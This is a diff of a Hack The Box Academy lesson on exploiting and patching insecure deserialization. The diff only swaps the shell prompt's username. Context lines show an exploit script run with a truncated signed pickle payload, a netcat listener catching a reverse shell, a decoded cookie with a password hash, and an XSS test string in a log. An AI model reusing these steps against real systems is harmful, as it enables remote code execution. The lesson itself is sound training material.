@@ -87,7 +87,7 @@ Assuming `HTBooks` implemented this HMAC verification, and we were able to read 
 Patching Deserialization Vulnerabilities
 
 ```bash
-maxrandhahn@htb[/htb]$ tree exploitexploit
+htb-student@htb[/htb]$ tree exploitexploit
 ├── exploit.py
 └── util
     └── config.py
@@ -137,7 +137,7 @@ Running the updated exploit code will give us a longer payload (since it include
 Patching Deserialization Vulnerabilities
 
 ```bash
-maxrandhahn@htb[/htb]$ python3 exploit.py gASVPAAAAAAAAACMBXBvc2l...SNIP...5IC1lIC9iaW4vc2iUhZRSlC4=.jlPg/hUsa4aLr0SpFq06Xya0i8IJzyh6ELt...SNIP...I5CyQa2yejlPNX5Tg==
+htb-student@htb[/htb]$ python3 exploit.py gASVPAAAAAAAAACMBXBvc2l...SNIP...5IC1lIC9iaW4vc2iUhZRSlC4=.jlPg/hUsa4aLr0SpFq06Xya0i8IJzyh6ELt...SNIP...I5CyQa2yejlPNX5Tg==
 
 ```
 
@@ -146,7 +146,7 @@ We can start a local Netcat listener, paste the cookie value in and receive a re
 Patching Deserialization Vulnerabilities
 
 ```bash
-maxrandhahn@htb[/htb]$ nc -nvlp 9999Ncat: Version 7.93 ( https://nmap.org/ncat )
+htb-student@htb[/htb]$ nc -nvlp 9999Ncat: Version 7.93 ( https://nmap.org/ncat )
 Ncat: Listening on :::9999
 Ncat: Listening on 0.0.0.0:9999
 Ncat: Connection from 192.168.43.164.
@@ -304,7 +304,7 @@ At this point, the vulnerabilities should all be fixed! If we run the new server
 Avoiding Deserialization Vulnerabilities
 
 ```bash
-maxrandhahn@htb[/htb]$ echo eyJuYW1lIjoicGVudGVzdCIsImVtYWlsIjoicGVudGVzdEB0ZXN0LmNvbSIsInBhc3N3b3JkIjoiJDJ5JDEwJHU1bzZ1MkViak9tb2JRalZ0dTg3UU84WndRc0RkMnp6b3Fqd1MwLjV6dVByM2hxazl3ZmRhIiwicHJvZmlsZV9waWMiOiJ1cGxvYWRzXC83ZTRjMDkwZjdhMjBkMmI5YmVkYmE3ZGEwNTAyN2UzOS5qcGcifQ== | base64 -d{"name":"pentest","email":"pentest@test.com","password":"$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda","profile_pic":"uploads\/7e4c090f7a20d2b9bedba7da05027e39.jpg"}
+htb-student@htb[/htb]$ echo eyJuYW1lIjoicGVudGVzdCIsImVtYWlsIjoicGVudGVzdEB0ZXN0LmNvbSIsInBhc3N3b3JkIjoiJDJ5JDEwJHU1bzZ1MkViak9tb2JRalZ0dTg3UU84WndRc0RkMnp6b3Fqd1MwLjV6dVByM2hxazl3ZmRhIiwicHJvZmlsZV9waWMiOiJ1cGxvYWRzXC83ZTRjMDkwZjdhMjBkMmI5YmVkYmE3ZGEwNTAyN2UzOS5qcGcifQ== | base64 -d{"name":"pentest","email":"pentest@test.com","password":"$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda","profile_pic":"uploads\/7e4c090f7a20d2b9bedba7da05027e39.jpg"}
 
 ```
 
@@ -317,7 +317,7 @@ Our custom attack payloads will not work anymore, nor for the XSS...
 Avoiding Deserialization Vulnerabilities
 
 ```bash
-maxrandhahn@htb[/htb]$ tail /tmp/htbank.log [13.10.2022 12:35:15] Serialized user 'pentest'
+htb-student@htb[/htb]$ tail /tmp/htbank.log [13.10.2022 12:35:15] Serialized user 'pentest'
 [13.10.2022 12:35:55] Serialized user '<script>alert(1)</script>'
 [13.10.2022 12:36:02] Unserialized user '<script>alert(1)</script>'
 [13.10.2022 12:37:56] Serialized user 'pentest'
